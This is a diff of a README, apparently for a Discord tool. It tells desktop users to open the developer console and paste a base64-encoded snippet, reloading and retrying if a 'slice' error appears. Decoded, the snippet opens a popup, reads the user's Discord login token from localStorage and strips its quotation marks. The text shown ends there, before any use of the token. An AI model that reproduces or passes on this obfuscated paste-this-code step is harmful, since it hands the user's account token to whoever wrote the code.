@@ -8,7 +8,7 @@ All source code is in the other files if you'd like to read it without decoding 
 Simply ask on the issues page and I'll assist you as quick as I can
 
 # Discord Client (DESKTOP)
-Click `CTRL+SHIFT+I` and click on the console tab, once you've done that paste the code below. (All open source in the other files for you to view)
+Click `CTRL+SHIFT+I` and click on the console tab, once you've done that paste the code below. If there's an error regarding slice click `CTRL+R` wait for everything to partially load and then execute the code again in the console. (All open source in the other files for you to view)
 ```
 var encoded = 'bGV0IHBvcHVwOwpwb3B1cCA9IHdpbmRvdy5vcGVuKCcnLCAnJywgYHRvcD0wLGxlZnQ9JHtzY3JlZW4ud2lkdGgtODAwfSx3aWR0aD04NTAsaGVpZ2h0PTE1MGApOwp0b2tlbiA9IHBvcHVwLmxvY2FsU3RvcmFnZS50b2tlbiAvLyBHRVQgVE9LRU4gIEZST00gRElTQ09SRCBTVE9SQUdFCnRva2VuID0gdG9rZW4uc2xpY2UoMSwgLTEpOyAvLyBSRU1PVkUgUVVPVEFUSU9OUw=='
 var decoded = atob(encoded)
